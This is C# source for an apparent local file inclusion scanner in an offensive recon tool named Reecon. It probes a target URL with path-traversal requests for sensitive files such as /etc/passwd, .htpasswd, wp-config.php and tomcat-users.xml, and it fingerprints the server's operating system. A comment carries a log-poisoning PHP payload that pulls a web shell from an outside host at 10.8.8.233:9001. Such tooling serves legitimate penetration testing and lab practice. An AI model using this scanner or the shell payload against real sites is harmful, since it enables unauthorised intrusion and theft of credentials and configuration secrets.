using System;
using System.Collections.Generic;
using System.Net;
using ReeCode;

namespace Reecon
{
    class LFI
    {
        private static WebClient wc = new WebClient();
        private static string initialPart = "";
        private static int notFoundLength = 0;
        public static void Scan(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("LFI Usage: reecon -lfi http://www.site.com/bla.php?include=file");
                return;
            }
            ScanPath(args[1]);
        }
        private static void ScanPath(string path)
        {
            Console.WriteLine("Starting LFI Scan - This feature is still in Alpha");
            // Init
            InitialChecks(path);

            // Find OS
            var OS = GetOS();

            if (OS == General.OS.Linux)
            {
                // General web checks
                List<string> webChecks = new List<string>();
                webChecks.Add("/var/www/html/.htpasswd");
                webChecks.Add("/var/www/html/forum/.htpasswd");

                // Wordpress
                webChecks.Add("var/www/html/wp-config.php");
                webChecks.Add("var/www/html/wordpress/wp-config.php");
                DoLFI(webChecks);

                // Do nginx checks
                List<string> linux_nginx = new List<string>();
                linux_nginx.Add("/etc/nginx/sites-available/default");
                DoLFI(linux_nginx);

                // Do Apache2 Checks - https://packages.ubuntu.com/eoan/all/apache2/filelist
                List<string> linux_apache = new List<string>();
                linux_apache.Add("/etc/apache2/sites-available/000-default.conf");
                bool hasApache = DoLFI(linux_apache);
                if (hasApache)
                {
                    // Apache2 Log Poisoning Path (Very restricted): 
                    bool apache2Log = DoLFI(new List<string>() { "/var/log/apache2/access.log" });
                    if (apache2Log)
                    {
                        // Log poisoning file upload
                        // Mozilla/5.0 <?php file_put_contents('reeshell.php', file_get_contents('http://10.8.8.233:9001/reeshell.php'))?> Firefox/70.0
                        Console.WriteLine("LFI - Log Poisoning File Upload - Bug Reelix");
                    }
                }

                // Do MySQL Checks
                List<string> linux_mysql = new List<string>();
                linux_mysql.Add("/etc/my.cnf");
                linux_mysql.Add("/etc/mysql/my.cnf");
                linux_mysql.Add("/var/log/mysql/error.log");
                DoLFI(linux_mysql);

                // Do Tomcat9 Checks - https://packages.ubuntu.com/eoan/all/tomcat9/filelist
                List<string> linux_tomcat9 = new List<string>();
                linux_tomcat9.Add("/etc/cron.daily/tomcat9");
                linux_tomcat9.Add("/etc/rsyslog.d/tomcat9.conf");
                linux_tomcat9.Add("/usr/lib/sysusers.d/tomcat9.conf");
                linux_tomcat9.Add("/usr/lib/tmpfiles.d/tomcat9.conf");
                linux_tomcat9.Add("/usr/libexec/tomcat9/tomcat-start.sh");
                linux_tomcat9.Add("/usr/share/tomcat9/etc/server.xml");
                linux_tomcat9.Add("/usr/share/tomcat9/etc/tomcat-users.xml");
                linux_tomcat9.Add("/usr/share/tomcat9/etc/web.xml");
                linux_tomcat9.Add("/var/lib/tomcat9/webapps/ROOT/index.html");
                DoLFI(linux_tomcat9);
            }
            else if (OS == General.OS.Windows)
            {
                // Do IIS Checks
                Console.WriteLine("LFI - Windows - Bug Reelix");
            }
            else
            {
                Console.WriteLine("LFI - Unknown OS - Bug Reelix");
                // Unknown - Do All Checks
            }
            Console.WriteLine("All Checks Done!");
        }

        // Initial Checks
        private static void InitialChecks(string path)
        {
            Console.WriteLine("Scanning: " + path);
            HttpStatusCode statusCode = wc.GetResponseCode(path);
            if (statusCode != HttpStatusCode.OK)
            {
                Console.WriteLine(path + " is not an OK page :(");
                Environment.Exit(0);
            }

            initialPart = path.Substring(0, path.IndexOf("=") + 1);
            string result = wc.Get(initialPart + "Reelix", null);
            notFoundLength = result.Length;
            Console.WriteLine("NFL: " + notFoundLength);
        }

        private static General.OS GetOS()
        {
            // Linux
            List<string> linuxChecks = new List<string>();
            linuxChecks.Add("/etc/passwd");
            linuxChecks.Add("/etc/resolv.conf");
            linuxChecks.Add("/var/www/index.php");
            linuxChecks.Add("/var/www/html/index.php");
            bool hasResult = DoLFI(linuxChecks);
            if (hasResult)
            {
                return General.OS.Linux;
            }

            // Windows
            List<string> windowsChecks = new List<string>();
            windowsChecks.Add("/boot.ini"); // Basic boot.ini
            windowsChecks.Add("/inetpub/wwwroot/index.php"); // Basic IIS Webserver
            windowsChecks.Add("/Windows/debug/NetSetup.log"); // Some basic Windows info
            windowsChecks.Add("/Windows/SoftwareDistribution/ReportingEvents.log"); // Windows Patches
            windowsChecks.Add("/Windows/System32/cmd.exe"); // What Windows box doesn't have cmd?
            windowsChecks.Add("/Windows/win.ini"); // Should have this
            hasResult = DoLFI(windowsChecks);
            if (hasResult)
            {
                return General.OS.Windows;
            }

            return General.OS.Unknown;
        }

        private static bool DoLFI(List<string> lfiChecks)
        {
            // TODO: Null Byte each
            // TODO: Base64 Encode Each --> bla=php://filter/convert.base64-encode/resource=locationHere

            // If it must contain a word
            // php://filter/read=convert.base64-encode/wordhere/resource=flag

            foreach (string check in lfiChecks)
            {
                // Check Base
                string toCheck = initialPart + check;
                int resultLength = 0;
                try
                {
                    resultLength = wc.DownloadString(toCheck).Length;
                    if (resultLength != notFoundLength)
                    {
                        Console.WriteLine(resultLength + " -- " + toCheck);
                        // Don't need to try more if it's already true
                        return true;
                    }
                }
                catch (Exception)
                {
                    // Nope!
                }
                // Check with ../'s
                toCheck = initialPart + "/../../../../.." + check;
                try
                {
                    resultLength = wc.DownloadString(toCheck).Length;
                    if (resultLength != notFoundLength)
                    {
                        Console.WriteLine(resultLength + " -- " + toCheck);
                        return true;
                    }
                }
                catch (Exception)
                {
                    // Nope!
                }
            }
            return false;
        }
    }
}
